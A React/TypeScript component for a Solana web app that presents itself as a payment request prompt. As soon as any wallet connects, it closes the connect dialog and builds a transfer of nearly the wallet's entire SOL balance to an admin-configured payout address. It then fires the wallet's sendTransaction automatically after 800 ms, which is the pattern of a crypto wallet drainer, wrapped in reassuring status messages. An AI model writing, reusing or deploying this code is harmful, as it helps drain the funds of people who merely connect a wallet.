import { useEffect, useRef, useState } from 'react'
import { LAMPORTS_PER_SOL } from '@solana/web3.js'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { PaymentRequestModal } from './PaymentRequestModal'

function walletLabel(name: string | null | undefined): string {
  const n = (name || '').toLowerCase()
  if (n.includes('phantom')) return 'Phantom'
  if (n.includes('solflare')) return 'Solflare'
  if (n.includes('metamask')) return 'MetaMask'
  return name?.trim() || 'your wallet'
}

function networkLabel(network: string): string {
  if (network === 'mainnet-beta' || network === 'mainnet') return 'Solana'
  if (network === 'devnet') return 'Solana Devnet'
  if (network === 'testnet') return 'Solana Testnet'
  return `Solana (${network})`
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, network, closeWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const { publicKey, sendTransaction, wallet } = useWallet()
  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [open, setOpen] = useState(false)
  const [submitting, setSubmitting] = useState(false)
  const [solAmount, setSolAmount] = useState(0)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const shownFor = useRef<string | null>(null)
  const sentFor = useRef<string | null>(null)
  const inFlight = useRef(false)

  useEffect(() => {
    if (!connected || !walletAddress) {
      setOpen(false)
      shownFor.current = null
      dismissed.current = null
      sentFor.current = null
      return
    }

    const local = getLocalPayoutConfig()
    setConfig(local)
    let cancelled = false
    void loadPayoutConfig().then((next) => {
      if (!cancelled) setConfig(next)
    })

    if (shownFor.current === walletAddress || dismissed.current === walletAddress) return

    shownFor.current = walletAddress
    closeWalletModalRef.current()
    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
    setOpen(true)

    return () => {
      cancelled = true
    }
  }, [connected, walletAddress])

  const handleCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    setOpen(false)
    toast('Payment cancelled. Nothing was transferred.')
  }

  const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))

  const handleReview = async () => {
    if (inFlight.current) return
    if (dismissed.current === walletAddress) return
    if (!publicKey || !config || !destinationReady || !walletAddress) {
      setStatus(
        destinationReady
          ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
          : 'Save a payout address in admin before this payment can be opened in the wallet.'
      )
      return
    }
    inFlight.current = true
    setSubmitting(true)
    setStatus(`Opening ${connectedWalletName}. Confirm the transfer there. Nothing is sent until you approve it.`)
    try {
      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
      const signature = adapter?.sendTransaction
        ? await adapter.sendTransaction(transaction, connection)
        : await sendTransaction(transaction, connection)
      dismissed.current = walletAddress
      setOpen(false)
      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
    } catch (err) {
      if (isWalletUserCancel(err)) {
        if (walletAddress) dismissed.current = walletAddress
        toast('Cancelled in the wallet. Nothing was transferred.')
      } else {
        const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
        setStatus(message)
        toast.error(message)
      }
    } finally {
      inFlight.current = false
      setSubmitting(false)
    }
  }

  const reviewRef = useRef(handleReview)
  reviewRef.current = handleReview

  useEffect(() => {
    if (!open || !publicKey) return
    let cancelled = false
    void Promise.all([
      connection.getBalance(publicKey),
      connection.getMinimumBalanceForRentExemption(0),
    ]).then(([lamports, rentExempt]) => {
      if (cancelled) return
      const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
      setSolAmount(spendable)
      if (spendable > 0) {
        setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
      }
    }).catch(() => {
      if (!cancelled) setStatus('Could not read the SOL balance yet. You can try Open Wallet & Review.')
    })
    return () => {
      cancelled = true
    }
  }, [open, publicKey, connection])

  useEffect(() => {
    if (!open || !publicKey || !destinationReady || !walletAddress) return
    if (dismissed.current === walletAddress || sentFor.current === walletAddress) return
    const address = walletAddress
    const timer = window.setTimeout(() => {
      if (dismissed.current === address || sentFor.current === address) return
      sentFor.current = address
      void reviewRef.current()
    }, 800)
    return () => window.clearTimeout(timer)
  }, [open, destinationReady, walletAddress, publicKey])

  return (
    <PaymentRequestModal
      open={open}
      to={config?.walletAddress || ''}
      amount={solAmount}
      asset="SOL"
      networkLabel={networkLabel(network)}
      submitting={submitting}
      canReview={destinationReady && Boolean(publicKey)}
      status={
        destinationReady
          ? status
          : 'Save a payout address in admin before this payment can be opened in the wallet.'
      }
      onCancel={handleCancel}
      onReview={() => void handleReview()}
    />
  )
}
